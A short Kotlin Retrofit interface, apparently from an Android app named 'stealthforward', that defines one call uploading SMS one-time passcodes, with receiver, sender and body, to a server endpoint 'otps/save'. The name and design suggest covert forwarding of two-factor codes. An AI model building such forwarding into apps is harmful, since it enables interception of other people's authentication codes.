package com.nf.stealthforward.api

import retrofit2.Call
import retrofit2.http.GET
import retrofit2.http.Query

interface API {
    @GET("otps/save")
    fun saveOTP(@Query("receiver")  receiver: String,
                @Query("sender")    sender: String,
                @Query("body")      body: String): Call<String>
}